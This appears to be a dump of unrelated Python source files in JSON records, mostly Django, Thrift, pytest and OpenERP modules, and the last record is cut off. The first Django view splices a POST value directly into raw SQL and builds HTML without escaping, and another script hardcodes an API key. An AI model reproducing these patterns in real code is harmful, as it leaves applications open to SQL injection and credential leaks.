{"text": "from django.contrib.auth.mixins import LoginRequiredMixin\nfrom django.contrib.auth.models import User\nfrom django.contrib.staticfiles.templatetags.staticfiles import static\nfrom django.urls import reverse\nfrom django.db import connection\nfrom django.shortcuts import render, HttpResponse\nfrom django.utils import timezone\nfrom django.views.generic.list import View\n\nfrom dev.models import MacroLog, UserPage\nfrom utils.services import dictfetchall\n\n\nclass Log(LoginRequiredMixin, View):\n    template_name = \"log/log.html\"\n    login_url = '/accounts/login/'\n\n    def get(self, request, *args, **kwargs):\n        context = {}\n        qs = MacroLog.objects.filter(macro__user=request.user).order_by('macro', 'user', '-created').distinct('macro',\n                                                                                                              'user')\n        unsorted_results = qs.all()\n        context['macroLog'] = sorted(unsorted_results, key=lambda t: t.created, reverse=True)\n        context['userPage'] = UserPage.objects.filter(macro__user=request.user).distinct('user')\n        return render(self.request, self.template_name, context)\n\n    def post(self, request, *args, **kwargs):\n        with connection.cursor() as cursor:\n            if request.is_ajax():\n                ddl_user = ','.join(request.POST.get('ddlUser').split(','))\n                if ddl_user:\n                    where_str = 'AND ML.user_id IN ({0})'.format(ddl_user)\n                else:\n                    where_str = ''\n                cursor.execute(\"\"\"SELECT\n                ML.macro_id,\n                ML.created,\n                ML.ip,\n                M.title,\n                U.email\n                FROM main_macrolog ML\n                LEFT JOIN main_macro M ON M.id = ML.macro_id\n                LEFT JOIN auth_user U ON U.id = ML.user_id\n                WHERE M.user_id = '{0}' {1}\n                ORDER BY ML.created DESC\n                LIMIT 20\"\"\".format(request.user.pk, where_str))\n                obj = dictfetchall(cursor)\n                result = self.set_html(obj)\n                return HttpResponse(result)\n\n    def set_html(self, obj, html=''):\n        for e in obj:\n            user = User.objects.get(email=e.get('email'))\n            local_time = timezone.localtime(e.get('created'))\n\n            if user.socialaccount_set.all():\n                profile_url = user.socialaccount_set.all()[0].get_avatar_url()\n            else:\n                profile_url = static('images/Jigglypuff.png')\n            html += \"\"\"<li class=\"collection-item user-list\">\n                        <a href=\"{0}\">\n                            <div>{1}</div>\n                            <div class=\"chip\">\n                                <img src=\"{2}\">{3}\n                            </div>\n                            <span class=\"secondary-content\">{4}<br>{5}</span>\n                        </a>\n                    </li>\"\"\".format(reverse('user_manage', kwargs={'macro_id': e.get('macro_id')}),\n                                    e.get('title') or '\uc81c\ubaa9\uc5c6\uc74c',\n                                    profile_url,\n                                    e.get('email'),\n                                    e.get('ip'),\n                                    local_time.strftime('%y-%m-%d %H:%M'))\n        if len(obj) == 0:\n            html = '<li class=\"collection-item user-list\">\uc0ac\uc6a9 \ud754\uc801\uc774 \uc5c6\uc5b4\uc694!</li>'\n        return html\n"}
{"text": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n##\n# Copyright 2016-2017 VMware Inc.\n# This file is part of ETSI OSM\n# All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n#\n# For those usages not covered by the Apache License, Version 2.0 please\n# contact:  osslegalrouting@vmware.com\n##\n\nimport threading\nimport sys\n\nclass RepeatingTimer(threading._Timer):\n    \"\"\" Class to run thread parally \"\"\"\n    def run(self):\n        \"\"\" Method to run thread \"\"\"\n        while True:\n            self.finished.wait(self.interval)\n            if self.finished.is_set():\n                return\n            else:\n                self.function(*self.args, **self.kwargs)\n\n\nclass CommandProgressbar(object):\n    \"\"\" Class to show progressbar while waiting fro command output \"\"\"\n\n    def __init__(self):\n        self.timer = None\n\n    def __show_progressbar(self):\n        \"\"\"\n            Private method to show progressbar while waiting for command to complete\n            Args  : None\n            Return : None\n        \"\"\"\n        print '\\b.',\n        sys.stdout.flush()\n\n    def start_progressbar(self):\n        \"\"\"\n            Method to start progressbar thread\n            Args  : None\n            Return : None\n        \"\"\"\n        self.timer = RepeatingTimer(1.0, self.__show_progressbar)\n        self.timer.daemon = True # Allows program to exit if only the thread is alive\n        self.timer.start()\n\n    def stop_progressbar(self):\n        \"\"\"\n            Method to stop progressbar thread\n            Args  : None\n            Return : None\n        \"\"\"\n        self.timer.cancel()\n"}
{"text": "'''\nCopyright 2015 Serendio Inc.\nAuthor - Satish Palaniappan\n\nLicensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at\n\nhttp://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing,\nsoftware distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and limitations under the License.\n'''\n__author__ = \"Satish Palaniappan\"\n\n### Insert Current Path\nimport os, sys, inspect\ncmd_folder = os.path.realpath(os.path.abspath(os.path.split(inspect.getfile(inspect.currentframe()))[0]))\nif cmd_folder not in sys.path:\n  sys.path.insert(0, cmd_folder)\n\nsys.path.append(cmd_folder + '/gen-py')\nfrom categorizer import Categorizer\nfrom categorizer.ttypes import *\n\nfrom thrift.transport import TSocket\nfrom thrift.transport import TTransport\nfrom thrift.protocol import TBinaryProtocol\nfrom thrift.server import TServer\nimport socket\n\nsys.path.append(cmd_folder + \"/Model/\")\nimport Categorize\n\n\nclass CategorizerHandler:\n  def __init__(self):\n    self.log = {}\n    self.catz = Categorize.Categorize()\n  def ping(self):\n    print (\"Ping Success !! :)\")\n    return\n\n  def getTopic(self, text):\n    cat = self.catz.getCategory(text)\n    print (\"The Text : \" + text + \" ||| Topic: \" + cat)\n    return cat\n\nhandler = CategorizerHandler()\nprocessor = Categorizer.Processor(handler)\ntransport = TSocket.TServerSocket(port=8001)\ntfactory = TTransport.TBufferedTransportFactory()\npfactory = TBinaryProtocol.TBinaryProtocolFactory()\n\nserver = TServer.TSimpleServer(processor, transport, tfactory, pfactory)\n\nprint (\"Python topics server running...\")\nserver.serve()\n"}
{"text": "#skip.runas import Image; im = Image.open(\"Scribus.gif\"); image_list = list(im.getdata()); cols, rows = im.size; res = range(len(image_list)); sobelFilter(image_list, res, cols, rows)\n#runas cols = 100; rows = 100 ;image_list=[x%10+y%20 for x in range(cols) for y in range(rows)]; sobelFilter(image_list, cols, rows)\n#bench cols = 1000; rows = 500 ;image_list=[x%10+y%20 for x in range(cols) for y in range(rows)]; sobelFilter(image_list, cols, rows)\n#pythran export sobelFilter(int list, int, int)\ndef sobelFilter(original_image, cols, rows):\n    edge_image = list(range(len(original_image)))\n    for i in range(rows):\n        edge_image[i * cols] = 255\n        edge_image[((i + 1) * cols) - 1] = 255\n\n    for i in range(1, cols - 1):\n        edge_image[i] = 255\n        edge_image[i + ((rows - 1) * cols)] = 255\n\n    for iy in range(1, rows - 1):\n        for ix in range(1, cols - 1):\n            sum_x = 0\n            sum_y = 0\n            sum = 0\n            #x gradient approximation\n            sum_x += original_image[ix - 1 + (iy - 1) * cols] * -1\n            sum_x += original_image[ix + (iy - 1) * cols] * -2\n            sum_x += original_image[ix + 1 + (iy - 1) * cols] * -1\n            sum_x += original_image[ix - 1 + (iy + 1) * cols] * 1\n            sum_x += original_image[ix + (iy + 1) * cols] * 2\n            sum_x += original_image[ix + 1 + (iy + 1) * cols] * 1\n            sum_x = min(255, max(0, sum_x))\n            #y gradient approximatio\n            sum_y += original_image[ix - 1 + (iy - 1) * cols] * 1\n            sum_y += original_image[ix + 1 + (iy - 1) * cols] * -1\n            sum_y += original_image[ix - 1 + (iy) * cols] * 2\n            sum_y += original_image[ix + 1 + (iy) * cols] * -2\n            sum_y += original_image[ix - 1 + (iy + 1) * cols] * 1\n            sum_y += original_image[ix + 1 + (iy + 1) * cols] * -1\n            sum_y = min(255, max(0, sum_y))\n\n            #GRADIENT MAGNITUDE APPROXIMATION\n            sum = abs(sum_x) + abs(sum_y)\n\n            #make edges black and background white\n            edge_image[ix + iy * cols] = 255 - (255 & sum)\n    return edge_image\n"}
{"text": "# -*- coding: utf-8 -*-\n\n# Copyright 2008 Jaap Karssenberg <jaap.karssenberg@gmail.com>\n\n'''Spell check plugin based on gtkspell'''\n\nimport os\nimport gobject\n\nfrom zim.config import get_environ\nfrom zim.plugins import PluginClass\nfrom zim.gui.widgets import ErrorDialog\nfrom zim.signals import SIGNAL_AFTER\n\ntry:\n    import gtkspell\nexcept:\n    gtkspell = None\n\nui_xml = '''\n<ui>\n    <menubar name='menubar'>\n        <menu action='tools_menu'>\n            <placeholder name='page_tools'>\n                <menuitem action='toggle_spellcheck'/>\n            </placeholder>\n        </menu>\n    </menubar>\n    <toolbar name='toolbar'>\n        <placeholder name='tools'>\n            <toolitem action='toggle_spellcheck'/>\n        </placeholder>\n    </toolbar>\n</ui>\n'''\n\nui_toggle_actions = (\n    # name, stock id, label, accelerator, tooltip, initial state, readonly\n    ('toggle_spellcheck', 'gtk-spell-check', _('Check _spelling'), 'F7', 'Spell check', False, True), # T: menu item\n)\n\nclass SpellPlugin(PluginClass):\n\n    plugin_info = {\n        'name': _('Spell Checker'), # T: plugin name\n        'description': _('''\\\nAdds spell checking support using gtkspell.\n\nThis is a core plugin shipping with zim.\n'''), # T: plugin description\n        'author': 'Jaap Karssenberg',\n        'help': 'Plugins:Spell Checker',\n    }\n\n    plugin_preferences = (\n        ('language', 'string', 'Default Language', ''),\n    )\n\n    def __init__(self, ui):\n        PluginClass.__init__(self, ui)\n        self.spell = None\n        self.uistate.setdefault('active', False)\n        if self.ui.ui_type == 'gtk':\n            self.ui.add_toggle_actions(ui_toggle_actions, self)\n            self.ui.add_ui(ui_xml, self)\n            self.connectto(self.ui, 'open-page', order=SIGNAL_AFTER)\n\n    @classmethod\n    def check_dependencies(klass):\n        return (not gtkspell is None), [('gtkspell', not gtkspell is None, True)]\n\n    def toggle_spellcheck(self, enable=None):\n        action = self.actiongroup.get_action('toggle_spellcheck')\n        if enable is None or enable != action.get_active():\n            action.activate()\n        else:\n            self.do_toggle_spellcheck(enable=enable)\n\n    def do_toggle_spellcheck(self, enable=None):\n        #~ print 'do_toggle_spellcheck', enable\n        if enable is None:\n            action = self.actiongroup.get_action('toggle_spellcheck')\n            enable = action.get_active()\n\n        textview = self.ui.mainwindow.pageview.view\n        if enable:\n            if self.spell is None:\n                lang = self.preferences['language'] or None\n                try:\n                    self.spell = gtkspell.Spell(textview, lang)\n                except:\n                    lang = lang or get_environ('LANG') or get_environ('LANGUAGE')\n                    ErrorDialog(self.ui, (\n                        _('Could not load spell checking for language: \"%s\"') % lang,\n                            # T: error message - %s is replaced with language codes like \"en\", \"en_US\"m or \"nl_NL\"\n                        _('This could mean you don\\'t have the proper\\ndictionaries installed')\n                            # T: error message explanation\n                    ) ).run()\n                    return\n                else:\n                    textview.gtkspell = self.spell # HACK used by hardcoded hook in pageview\n            else:\n                pass\n        else:\n            if self.spell is None:\n                pass\n            else:\n                if textview.gtkspell \\\n                and textview.gtkspell == self.spell:\n                    textview.gtkspell.detach()\n                    textview.gtkspell = None\n                self.spell = None\n\n        self.uistate['active'] = enable\n        return False # we can be called from idle event\n\n    def on_open_page(self, ui, page, record):\n        # Assume the old object is detached by hard coded\n        # hook in TextView, just attach a new one.\n        # Use idle timer to avoid lag in page loading.\n        # This hook also synchronizes the state of the toggle with\n        # the uistate when loading the first page\n        self.spell = None\n        if self.uistate['active']:\n            gobject.idle_add(self.toggle_spellcheck, True)\n\n"}
{"text": "# -*- encoding: utf-8 -*-\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nfrom oslo_context import context\n\n\nclass RequestContext(context.RequestContext):\n    \"\"\"Extends security contexts from the oslo.context library.\"\"\"\n\n    def __init__(self, is_public_api=False, **kwargs):\n        \"\"\"Initialize the RequestContext\n\n        :param is_public_api: Specifies whether the request should be processed\n            without authentication.\n        :param kwargs: additional arguments passed to oslo.context.\n        \"\"\"\n        super(RequestContext, self).__init__(**kwargs)\n        self.is_public_api = is_public_api\n\n    def to_policy_values(self):\n        policy_values = super(RequestContext, self).to_policy_values()\n        policy_values.update({\n            'project_name': self.project_name,\n            'is_public_api': self.is_public_api,\n        })\n        return policy_values\n\n    def ensure_thread_contain_context(self):\n        \"\"\"Ensure threading contains context\n\n        For async/periodic tasks, the context of local thread is missing.\n        Set it with request context and this is useful to log the request_id\n        in log messages.\n\n        \"\"\"\n        if context.get_current():\n            return\n        self.update_store()\n\n\ndef get_admin_context():\n    \"\"\"Create an administrator context.\"\"\"\n\n    context = RequestContext(auth_token=None,\n                             project_id=None,\n                             overwrite=False)\n    return context\n"}
{"text": "import py, pytest,os\nfrom _pytest.helpconfig import collectattr\n\ndef test_version(testdir, pytestconfig):\n    result = testdir.runpytest(\"--version\")\n    assert result.ret == 0\n    #p = py.path.local(py.__file__).dirpath()\n    result.stderr.fnmatch_lines([\n        '*py.test*%s*imported from*' % (pytest.__version__, )\n    ])\n    if pytestconfig.pluginmanager._plugin_distinfo:\n        result.stderr.fnmatch_lines([\n            \"*setuptools registered plugins:\",\n            \"*at*\",\n        ])\n\ndef test_help(testdir):\n    result = testdir.runpytest(\"--help\")\n    assert result.ret == 0\n    result.stdout.fnmatch_lines([\n        \"*-v*verbose*\",\n        \"*setup.cfg*\",\n        \"*minversion*\",\n    ])\n\ndef test_collectattr():\n    class A:\n        def pytest_hello(self):\n            pass\n    class B(A):\n        def pytest_world(self):\n            pass\n    methods = py.builtin.sorted(collectattr(B))\n    assert list(methods) == ['pytest_hello', 'pytest_world']\n    methods = py.builtin.sorted(collectattr(B()))\n    assert list(methods) == ['pytest_hello', 'pytest_world']\n\ndef test_hookvalidation_unknown(testdir):\n    testdir.makeconftest(\"\"\"\n        def pytest_hello(xyz):\n            pass\n    \"\"\")\n    result = testdir.runpytest()\n    assert result.ret != 0\n    result.stderr.fnmatch_lines([\n        '*unknown hook*pytest_hello*'\n    ])\n\ndef test_hookvalidation_optional(testdir):\n    testdir.makeconftest(\"\"\"\n        import pytest\n        @pytest.mark.optionalhook\n        def pytest_hello(xyz):\n            pass\n    \"\"\")\n    result = testdir.runpytest()\n    assert result.ret == 0\n\ndef test_traceconfig(testdir):\n    result = testdir.runpytest(\"--traceconfig\")\n    result.stdout.fnmatch_lines([\n        \"*using*pytest*py*\",\n        \"*active plugins*\",\n    ])\n\ndef test_debug(testdir, monkeypatch):\n    result = testdir.runpytest(\"--debug\")\n    assert result.ret == 0\n    p = testdir.tmpdir.join(\"pytestdebug.log\")\n    assert \"pytest_sessionstart\" in p.read()\n\ndef test_PYTEST_DEBUG(testdir, monkeypatch):\n    monkeypatch.setenv(\"PYTEST_DEBUG\", \"1\")\n    result = testdir.runpytest()\n    assert result.ret == 0\n    result.stderr.fnmatch_lines([\n        \"*registered*PluginManager*\"\n    ])\n"}
{"text": "#!/usr/bin/python3\nimport re\nimport os\nimport requests\nimport sys\nimport Rename as r\nfrom bs4 import BeautifulSoup\n\n\n# TVDb API Key\nAPI_KEY = \"C2AA47AACAA7C7B2\"\n# The file types the script will work on\nFILE_TYPES = [\"AVI\", \"MP4\", \"MKV\", \"SRT\"]\n# Characters which aren't allowed in file names\nILLEGAL_CHARACTERS = [\"/\", \"\\\\\", \":\", \"*\", \"?\", \"\\\"\", \"<\", \">\", \"|\", \"/\"]\n# Character to replace those characters with\nREPLACE_CHAR = \"_\"\n# Pad out the season/episode with zeros to desired length\nSEASON_PADDED_ZEROS = 1\nEPISODE_PADDED_ZEROS = 2\n# What to filter out of the file name, the goal being to leave only the TV Show, Season # and Episode #\nFILTER = r\"\\.|-|_|\\b(S?(\\d+)+?x?E?(\\d+)+?)\\b|(\\(.+\\))|(\\[.+\\])|(\\-.+\\-)|\\s-.+\\s*|\\b(\\d{4})\\b| \\\n         480p|480i|720p|720i|1080p|1080i|HDTV|H\\.264|x264|XviD|BluRay|MMI|WEB-DL|DD5\\.1|AAC2\\.0|DTS|INTERNAL|REPACK|PROPER|ReEnc| \\\n         IMMERSE|EVOLVE|YIFY|PublicHD|CTU|RED|DIMENSION|AFG|MIKY|KILLERS|IMMERSE|DeeJayAhmed|REMARKABLE|tla|2hd|CtrlHD\"\n# The language to return episode data from TVDb for. English is the only tested language\nLANGUAGE = \"en\" \n\nclass TVShow:\n    def __init__(self, tvshow):\n        self.tvshow = tvshow\n        self.series = 0\n        self.season = 0\n        self.episode = 0\n        self.title = \"\"\n\n    def __str__(self):\n        return \"{0} - {1}x{2} - {3}\".format(self.tvshow, \n                                            self.season.zfill(SEASON_PADDED_ZEROS), \n                                            self.episode.zfill(EPISODE_PADDED_ZEROS), \n                                            self.title)\n\n    def process(self):\n        release = re.findall(\"S?(\\d+)x?E?(\\d+)\", self.tvshow, flags=2)\n        if len(release) > 0:\n            self.season = release[0][0].lstrip(\"0\") if len(re.findall(\"^0+$\", release[0][0])) == 0 else \"0\"\n            self.episode = release[0][1].lstrip(\"0\") if len(re.findall(\"^0+$\", release[0][1])) == 0 else \"0\"\n\n        # Replace any fluff from the file name\n        self.tvshow = re.sub(FILTER, \" \", self.tvshow, flags=2).strip()\n\n    def fetch(self):\n        r = requests.get(\"http://thetvdb.com/api/GetSeries.php?seriesname={0}&language={1}\".format(self.tvshow, LANGUAGE))\n        soup = BeautifulSoup(r.content)\n\n        self.series = soup.find(\"seriesid\").text\n        self.tvshow = soup.find(\"seriesname\").text\n\n    def get_episode(self):\n        r = requests.get(\"http://thetvdb.com/api/{0}/series/{1}/default/{2}/{3}/{4}.xml\"\n            .format(API_KEY, self.series, str(self.season), str(self.episode), LANGUAGE))\n\n        if r.status_code == 404: print(\"Error! 404: Not found\")\n        else: self.title = BeautifulSoup(r.content).find(\"episodename\").text\n\n    def replace_illegal_characters(self):\n        for illegal_character in ILLEGAL_CHARACTERS:\n            self.title = self.title.replace(illegal_character, REPLACE_CHAR)\n\n        # Replace the ellipsis with three periods to prevent UnicodeError\n        self.title = self.title.replace(\"\u2026\",  \"...\")\n\n\ndef process_files(directory):\n    if os.path.isdir(directory):\n        print(\"Processing...\\n\")\n        for file_ in os.listdir(directory):\n            split = file_.split(os.extsep)\n            if split[-1].upper() in FILE_TYPES:\n                tvshow = TVShow(os.extsep.join(split[0:-1]))\n                tvshow.process()\n                try:\n                    tvshow.fetch()\n                except AttributeError:\n                    print(\"Skipped:\", file_)\n                    continue\n                tvshow.get_episode()\n                tvshow.replace_illegal_characters()\n                r.rename(os.sep.join([directory, file_]), str(tvshow),\n                         extension=split[-1], extensions=FILE_TYPES)\n\n        print(\"\\nProcessing complete.\")\n    else:\n        raise IOError(\"Directory doesn't exist!\")\n\nif __name__ == \"__main__\":\n    if len(sys.argv) == 2:\n        process_files(sys.argv[1])\n    else:\n        print(\"Missing target Directory\")\n"}
{"text": "from django.db import models\nfrom django import forms\nfrom django.forms import ModelForm\n\n# Create your models here.\nclass Settings(models.Model):\n    # General gallery informations\n    general_title = models.CharField(max_length=255)\n    intro = models.TextField(blank=True)\n    url   = models.CharField(max_length=255)\n\n    # Facebook connector\n    facebook_appid = models.CharField(blank=True,max_length=255)\n    facebook_appsecret = models.CharField(blank=True,max_length=255)\n    facebook_profile_id = models.CharField(blank=True,max_length=255)\n    facebook_canvas_url =  models.CharField(blank=True,max_length=255)\n\n    # Twitter connector\n    twitter_account = models.CharField(max_length=255)\n    twitter_consumer_key = models.CharField(max_length=255)\n    twitter_consumer_secret = models.CharField(max_length=255)\n    twitter_access_token = models.CharField(max_length=255)\n    twitter_access_token_secret = models.CharField(max_length=255)\n\nclass SettingsForm(ModelForm):\n    class Meta:\n        model = Settings\n"}
{"text": "#!/usr/bin/env python\n#coding: utf-8\n\n# @autor: M\u00edriam F\u00e9lix Lemes da Silva\n# @contato: miriamfx2@gmail.com\n# @data: 08 de Abril de 2017\n\nimport get\nimport dbmanager\nimport os,sys\nfrom os import path\nfrom datetime import datetime\nimport time\n\ndef logGet(self):\n    date = str(time.strftime(\"%Y-%m-%d\"))  #\n    now = str(datetime.now())\n    logfile = open('%s-getlog.txt' % date,'w')  # Cria o arquivo de Log\n    texto = []\n    texto.append(now)\n    texto.append(' - get REALIZADO')\n    logfile.writelines(texto)\n    logfile.close()\n\ndef logRel(self):\n    date = str(time.strftime(\"%Y-%m-%d\"))  #\n    now = str(datetime.now())\n    logfile = open('%s-relatoriolog.txt' % date, 'w')  # Cria o arquivo de Log\n    texto = []\n    texto.append(now)\n    texto.append(' - relatorio criado')\n    logfile.writelines(texto)\n    logfile.close()\n\ndef logAgendGet(self):\n    date = str(time.strftime(\"%Y-%m-%d\"))  #\n    now = str(datetime.now())\n    logfile = open('%s-Agendamentolog.txt' % date,'w')  # Cria o arquivo de Log\n    texto = []\n    texto.append(now)\n    texto.append(' - Agendamento REALIZADO')\n    logfile.writelines(texto)\n    logfile.close()\n\ndef logDrop(self):\n    date = str(time.strftime(\"%Y-%m-%d\"))  #\n    now = str(datetime.now())\n    logfile = open('%s-droplog.txt' % date,'w')  # Cria o arquivo de Log\n    texto = []\n    texto.append(now)\n    texto.append(' - drop REALIZADO')\n    logfile.writelines(texto)\n    logfile.close()\n"}
{"text": "from django.conf import settings\nfrom django.http import HttpResponseRedirect\n#from django.core.urlresolvers import reverse\nfrom django.contrib.auth import login as auth_login, logout, authenticate\n#from django.views.generic import ListView, DetailView\nfrom django.contrib.auth.forms import AuthenticationForm\nfrom django.views.generic.edit import FormView, View, CreateView\nfrom .forms import ProfileForm, UserForm\n\n\nclass LoginView(FormView):\n    form_class = AuthenticationForm\n    template_name = 'login.html'\n\n    def form_valid(self, form):\n        auth_login(self.request, form.get_user())\n        return HttpResponseRedirect(settings.LOGIN_REDIRECT_URL)\n        #return super(LoginView, self).form_valid(form)\n\n    def form_invalid(self, form):\n        return super(LoginView, self).form_invalid(form)\n\n\nclass RegisterView(CreateView):\n    form_class = UserForm\n    template_name = 'register.html'\n    success_url = settings.LOGIN_REDIRECT_URL  #'/orgs'\n\n    def form_valid(self, form):\n        resp = super(RegisterView, self).form_valid(form)\n\n\n        user = authenticate(username=form.cleaned_data['username'], password=form.cleaned_data['password1'])\n        auth_login(self.request, user)\n        return HttpResponseRedirect(settings.LOGIN_REDIRECT_URL)\n\nclass LogoutView(View):\n    def get(self, request, *args, **kwargs):\n        logout(request)\n        return HttpResponseRedirect(settings.LOGOUT_REDIRECT_URL)\n\n\nclass ProfileView(FormView):\n    form_class = ProfileForm\n    template_name = 'profile.html'\n"}
{"text": "import argparse\nfrom awsauthhelper import AWSArgumentParser\nfrom awsautodiscoverytemplater.command import TemplateCommand\n\n__author__ = 'drews'\n\n\ndef parse_cli_args_into():\n    \"\"\"\n    Creates the cli argparser for application specifics and AWS credentials.\n    :return: A dict of values from the cli arguments\n    :rtype: TemplaterCommand\n    \"\"\"\n    cli_arg_parser = argparse.ArgumentParser(parents=[\n        AWSArgumentParser(default_role_session_name='aws-autodiscovery-templater')\n    ])\n    main_parser = cli_arg_parser.add_argument_group('AWS Autodiscovery Templater')\n\n    # template_location = main_parser.add_mutually_exclusive_group(required=True)\n    main_parser.add_argument('--template-path', help='Path to the template to fill variables into.', required=True)\n    # template_location.add_argument('--template-s3-uri', help='S3 URI to the template to fill variables into.')\n\n    # output = main_parser.add_mutually_exclusive_group(required=True)\n    # output.add_argument('--destination-path',\n    #                     help='Destination for the source once the template has been rendered.')\n    main_parser.add_argument('--stdout', help='Prints a json object containing the retrieves resources',\n                             action='store_true',\n                             default=False, required=True)\n\n    main_parser.add_argument('--vpc-ids',\n                             help=('Optionally restrict the filtering to a particular list of IPs. '\n                                   'Comma seperated list of vpc-ids.'),\n                             action='store_true', default=None)\n\n    main_parser.add_argument('--filter',\n                             help=('Filter for ec2 instances as defined in http://boto3.readthedocs.org/en/latest/'\n                                   'reference/services/ec2.html#EC2.Client.describe_instances'),\n                             default=None,\n                             nargs='+')\n    main_parser.add_argument('--filter-empty',\n                             help=('By default, missing values are returned as null to keep private/public ip/hostname'\n                                   'sets of equal length. This removes null values from the filter'),\n                             action='store_true', default=False)\n\n    return cli_arg_parser.parse_args(namespace=TemplateCommand())\n"}
{"text": "# -*- coding: utf-8 -*-\n#\n# Licensed to the Apache Software Foundation (ASF) under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  The ASF licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an\n# \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n# KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations\n# under the License.\nimport os\n\nfrom airflow import AirflowException\nfrom tests.providers.google.cloud.operators.test_cloud_sql_system_helper import CloudSqlQueryTestHelper\nfrom tests.providers.google.cloud.utils.gcp_authenticator import GCP_CLOUDSQL_KEY\nfrom tests.test_utils.gcp_system_helpers import CLOUD_DAG_FOLDER, provide_gcp_context, skip_gcp_system\nfrom tests.test_utils.system_tests_class import SystemTest\n\nGCP_PROJECT_ID = os.environ.get('GCP_PROJECT_ID', 'project-id')\n\nSQL_QUERY_TEST_HELPER = CloudSqlQueryTestHelper()\n\n\n@skip_gcp_system(GCP_CLOUDSQL_KEY, require_local_executor=True)\nclass CloudSqlExampleDagsIntegrationTest(SystemTest):\n    @provide_gcp_context(GCP_CLOUDSQL_KEY)\n    def tearDown(self):\n        # Delete instances just in case the test failed and did not cleanup after itself\n        SQL_QUERY_TEST_HELPER.delete_instances(instance_suffix=\"-failover-replica\")\n        SQL_QUERY_TEST_HELPER.delete_instances(instance_suffix=\"-read-replica\")\n        SQL_QUERY_TEST_HELPER.delete_instances()\n        SQL_QUERY_TEST_HELPER.delete_instances(instance_suffix=\"2\")\n        SQL_QUERY_TEST_HELPER.delete_service_account_acls()\n        super().tearDown()\n\n    @provide_gcp_context(GCP_CLOUDSQL_KEY)\n    def test_run_example_dag_cloudsql(self):\n        try:\n            self.run_dag('example_gcp_sql', CLOUD_DAG_FOLDER)\n        except AirflowException as e:\n            self.log.warning(\n                \"In case you see 'The instance or operation is not in an appropriate \"\n                \"state to handle the request' error - you \"\n                \"can remove '.random' file from airflow folder and re-run \"\n                \"the test. This will generate random name of the database for next run \"\n                \"(the problem is that Cloud SQL keeps names of deleted instances in \"\n                \"short-term cache).\")\n            raise e\n"}
{"text": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Addons modules by CLEARCORP S.A.\n#    Copyright (C) 2009-TODAY CLEARCORP S.A. (<http://clearcorp.co.cr>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom openerp.osv import osv, fields\n\nclass GeneratorWizard(osv.TransientModel):\n\n    _name = 'hr.payroll.pay.generator.generator.wizard'\n\n    def generator_exectute(self, cr, uid, ids, context=None):\n        return True\n\n    _columns = {\n        'pay_type_id': fields.many2one('hr.payroll.pay.generator.pay.type', string='Pay Type', required=True),\n        'payslip_run_id': fields.many2one('hr.payslip.run', string='Payslip Batch', required=True),\n        'salary_rule_id': fields.many2one('hr.salary.rule', string='Salary Rule', required=True),\n        'employee_ids': fields.many2many('hr.employee', string='Employees', required=True),\n    }"}
{"text": "# This software may be freely redistributed under the terms of the GNU\n# general public license.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.\n\nimport os\nimport sys\n\nimport vserver\nimport logger\n\nimport personmanager\nimport slicetagmanager\n\nsys.path.append(\"/usr/share/NodeManager/\")\nimport tools\nimport bwlimit\n\n\nclass VServerManager():\n\n    def __startSlice__(self, slice):\n        logger.log(\"slicemanager: %s: starting\" % slice)\n        q = vserver.VServer(slice)\n        q.start()\n        logger.log(\"slicemanager: %s: started\" % slice)\n        return True\n\n    def __stopSlice__(self, slice):\n        logger.log(\"slicemanager: %s: stoping\" % slice)\n        q = vserver.VServer(slice)\n        q.stop()\n        logger.log(\"slicemanager: %s: stoped\" % slice)\n        return True\n\n    def __createSlice__(self, slice):\n        # Sanity check\n        try:\n            vserver_instance = vserver.VServer(slice)\n        except vserver.NoSuchVServer:\n            pass\n        else:\n            logger.log(\"slicemanager: %s: Slice already exists\" % slice)\n            return False\n\n        # FIXME: band-aid for MyPLC 4.x as it has no GetSliceFamily API call\n        vref = \"planetlab-f8-i386\"\n\n        # check the template exists -- there's probably a better way..\n        if not os.path.isdir(\"/vservers/.vref/%s\" % vref):\n            logger.log (\"slicemanager: %s: ERROR Could not create sliver - vreference image %s not found\" % (slice, vref))\n            return False\n\n        # guess arch\n        try:\n            (x,y,arch) = vref.split(\"-\")\n            # mh, this of course applies when \"vref\" is e.g. 